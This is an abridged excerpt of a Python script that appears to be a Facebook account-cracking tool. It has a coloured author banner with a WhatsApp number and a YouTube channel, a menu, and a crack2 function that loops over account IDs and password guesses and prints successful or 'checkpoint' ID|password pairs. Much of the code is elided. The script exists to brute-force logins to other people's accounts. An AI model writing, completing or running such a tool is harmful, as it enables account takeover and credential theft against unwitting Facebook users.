...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mJovan Ahmed 
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+8801753706851
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mUpdate Tricks channel
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #Bilo
	...
	if farhan in ['1','01']:
		...
		os.system("https://youtube.com/channel/UCF7OkB3R5o-mmyXzOZdVsdA")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [J0V4N] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [JOVAN-CP] %s|%s        '%(b,idf,pw))
